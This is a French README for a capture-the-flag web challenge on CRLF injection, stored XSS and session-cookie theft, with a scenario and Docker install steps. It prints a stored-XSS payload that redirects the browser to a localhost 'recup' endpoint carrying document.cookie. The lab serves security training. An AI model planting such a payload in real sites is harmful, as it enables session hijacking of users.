# CTF Web Client - CRLF + XSS Stored + Vol de session

## Présentation du CTF 
**ID** 26 dans **les CTFs de Cyrhades**


# la faille CRLF
CR et LF sont des caractères de contrôle ou bytecode qui peuvent être utilisés pour indiquer une fin de ligne dans un fichier texte.

CR = Carriage Return (Retour chariot) (\r, 0x0D en hexadécimal, 13 en décimal) — déplace le curseur au début de la ligne sans avancer à la ligne suivante.
LF = Line Feed, Saut de ligne (\n, 0x0A en hexadécimal, 10 en décimal) — déplace le curseur vers la ligne suivante sans retour au début de la ligne.
Un CR tout de suite suivi par un LF (CRLF, \r\n, ou 0x0D0A) descend le curseur vers la ligne suivante et le place au début de la ligne.

-------------------

Infiltrer les rangs du pirate informatique et récupérer ce qui nous appartient (le flag ^^) !

Nos systèmes de défense ont détecté une attaque sournoise qui s'est révélée être une injection XSS. 
Le but malveillant de cette attaque est de s'emparer du cookie de session.

Voici le script que notre administrateur réseau a découvert, tendant un piège perfide :

```<script>
window.location='https://localhost/recup?cookie='+document.cookie;
</script>
```

Pensez-vous posséder les compétences et l'audace nécessaires pour retourner la situation ? 
Pourchasser le pirate dans son propre royaume virtuel et reprennez le contrôle !


-----------

## Installation manuel
Vous n'utilisez pas l'application **les CTFs de Cyrhades** ? C'est dommage !
Mais voici comment installer ce CTF manuellement :

> git clone https://github.com/Hack-Oeil/CRLF_XSS_STORED_SESSION.git

> cd CRLF_XSS_STORED_SESSION && docker compose up
